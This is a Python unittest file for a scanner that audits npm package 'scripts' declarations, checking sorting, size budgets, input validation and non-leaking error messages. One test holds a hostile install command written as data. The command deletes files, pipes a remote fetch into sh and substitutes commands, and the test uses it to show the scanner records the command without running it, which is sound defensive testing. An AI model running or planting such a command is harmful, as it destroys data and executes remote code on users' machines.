import copy
import json
import unittest

try:
    from npm_tarball_audit.features.scripts_declaration_scan import run_feature
except ImportError:
    from src.npm_tarball_audit.features.scripts_declaration_scan import run_feature

ERROR = "Invalid scripts scan payload or budget"


class ScriptsDeclarationScanTest(unittest.TestCase):
    def assertInvalid(self, payload, secret=None):
        snapshot = copy.deepcopy(payload)
        with self.assertRaises(ValueError) as cm:
            run_feature(payload)
        self.assertEqual(str(cm.exception), ERROR)
        if secret is not None and secret not in ERROR:
            self.assertNotIn(secret, str(cm.exception))
        self.assertEqual(payload, snapshot)

    def test_none_returns_empty_fresh(self):
        payload = {"scripts": None}
        snapshot = copy.deepcopy(payload)
        result = run_feature(payload)
        self.assertEqual(result, {"scripts": [], "count": 0})
        self.assertEqual(set(result.keys()), {"scripts", "count"})
        self.assertEqual(payload, snapshot)
        result["scripts"].append({"name": "x", "command": "y"})
        result2 = run_feature(payload)
        self.assertEqual(result2, {"scripts": [], "count": 0})
        self.assertIsNot(result, result2)
        self.assertIsNot(result["scripts"], result2["scripts"])

    def test_sorts_by_codepoint_and_preserves_verbatim(self):
        payload = {"scripts": {"test": "node test.js", "prepare": "husky install"}}
        result = run_feature(payload)
        self.assertEqual(result["count"], 2)
        self.assertEqual(result["scripts"], [{"name": "prepare", "command": "husky install"}, {"name": "test", "command": "node test.js"}])
        payload2 = {"scripts": {"a": "  Keep  CASE  ", "B": "  spaced   cmd  "}}
        result2 = run_feature(payload2)
        self.assertEqual(result2["scripts"][0], {"name": "B", "command": "  spaced   cmd  "})
        self.assertEqual(result2["scripts"][1], {"name": "a", "command": "  Keep  CASE  "})
        self.assertEqual(result2["count"], 2)

    def test_examples_from_contract(self):
        r1 = run_feature({"scripts": {"prepare": "husky install", "test": "node test.js"}})
        self.assertEqual(r1["count"], 2)
        self.assertEqual(r1["scripts"][0]["name"], "prepare")
        r2 = run_feature({"scripts": None})
        self.assertEqual(r2, {"scripts": [], "count": 0})
        r3 = run_feature({"max_entries": 32, "max_length": 1024, "scripts": {"start": "node server.js"}})
        self.assertEqual(r3, {"scripts": [{"name": "start", "command": "node server.js"}], "count": 1})

    def test_invalid_payload_shapes(self):
        self.assertInvalid([], secret="[")
        self.assertInvalid(None, secret="None")
        self.assertInvalid("x", secret="x")
        self.assertInvalid({}, secret="{")
        self.assertInvalid({"scripts": None, "extra": 1}, secret="extra")
        self.assertInvalid({"max_entries": 32, "max_length": 1024}, secret="max")
        self.assertInvalid({"scripts": []}, secret="[]")
        self.assertInvalid({"scripts": "node"}, secret="node")
        self.assertInvalid({"scripts": 123}, secret="123")
        self.assertInvalid({"scripts": None, "max_entries": True}, secret="True")
        self.assertInvalid({"scripts": None, "max_length": False}, secret="False")
        self.assertInvalid({"scripts": None, "max_entries": 0}, secret="0")
        self.assertInvalid({"scripts": None, "max_length": -1}, secret="-1")
        self.assertInvalid({"scripts": None, "max_entries": 1.5}, secret="1.5")
        self.assertInvalid({"scripts": None, "max_length": "32"}, secret="32")
        self.assertInvalid({"scripts": None, "max_entries": None}, secret="None")
        self.assertInvalid({"scripts": {123: "cmd"}}, secret="123")
        self.assertInvalid({"scripts": {"ok": 123}}, secret="123")
        self.assertInvalid({"scripts": {"": "cmd"}}, secret="cmd")
        self.assertInvalid({"scripts": {"ok": ""}}, secret="ok")
        self.assertInvalid({"scripts": {"ok": None}}, secret="ok")
        self.assertInvalid({"scripts": {"ok": b"cmd"}}, secret="ok")

    def test_budgets_enforced(self):
        many = {}
        for i in range(33):
            many["k%02d" % i] = "cmd"
        self.assertInvalid({"scripts": many}, secret="k00")
        long_name = "n" * 1025
        self.assertInvalid({"scripts": {long_name: "cmd"}}, secret="nnn")
        long_cmd = "c" * 1025
        self.assertInvalid({"scripts": {"ok": long_cmd}}, secret="ccc")
        ok32 = {}
        for i in range(32):
            ok32["k%02d" % i] = "v"
        r = run_feature({"scripts": ok32})
        self.assertEqual(r["count"], 32)
        single_ok = {"scripts": {"n" * 1024: "c" * 1024}}
        r2 = run_feature(single_ok)
        self.assertEqual(r2["count"], 1)
        self.assertEqual(len(r2["scripts"][0]["name"]), 1024)
        self.assertEqual(len(r2["scripts"][0]["command"]), 1024)
        custom = {"scripts": {"a": "12345"}, "max_length": 5}
        self.assertEqual(run_feature(custom)["count"], 1)
        self.assertInvalid({"scripts": {"a": "123456"}, "max_length": 5}, secret="123456")
        self.assertInvalid({"scripts": {"a": "x", "b": "y", "c": "z"}, "max_entries": 2}, secret="k00")
        self.assertEqual(run_feature({"scripts": {"a": "x", "b": "y"}, "max_entries": 2})["count"], 2)

    def test_32_entries_within_64kib(self):
        scripts = {}
        for i in range(32):
            scripts["s%02d" % i] = "x" * 1024
        payload = {"scripts": scripts}
        result = run_feature(payload)
        self.assertEqual(result["count"], 32)
        blob = json.dumps(result)
        self.assertLess(len(blob.encode("utf-8")), 65536)
        blob2 = json.dumps(payload)
        self.assertLess(len(blob2.encode("utf-8")), 65536)

    def test_repeated_calls_equal_distinct_identities(self):
        payload = {"scripts": {"b": "cmd-b", "a": "cmd-a"}}
        first = run_feature(payload)
        second = run_feature(payload)
        self.assertEqual(first, second)
        self.assertIsNot(first, second)
        self.assertIsNot(first["scripts"], second["scripts"])
        self.assertIsNot(first["scripts"][0], second["scripts"][0])
        first["scripts"][0]["name"] = "mutated"
        third = run_feature(payload)
        self.assertEqual(third["scripts"][0]["name"], "a")

    def test_input_never_mutated(self):
        inner = {"z": "last", "a": "first"}
        payload = {"scripts": inner}
        snapshot = copy.deepcopy(payload)
        run_feature(payload)
        self.assertEqual(payload, snapshot)
        self.assertEqual(inner, {"z": "last", "a": "first"})

    def test_declaration_only_no_execution(self):
        evil = "rm -rf / && curl http://example.invalid | sh $(evil) `id`"
        result = run_feature({"scripts": {"install": evil}})
        self.assertEqual(result["count"], 1)
        self.assertEqual(result["scripts"][0]["command"], evil)
        self.assertEqual(result["scripts"][0]["name"], "install")

    def test_str_subclass_accepted(self):
        class MyStr(str):
            pass
        payload = {"scripts": {MyStr("build"): MyStr("node build.js")}}
        result = run_feature(payload)
        self.assertEqual(result["count"], 1)
        self.assertEqual(result["scripts"][0]["name"], "build")
        self.assertEqual(result["scripts"][0]["command"], "node build.js")


if __name__ == "__main__":
    unittest.main()
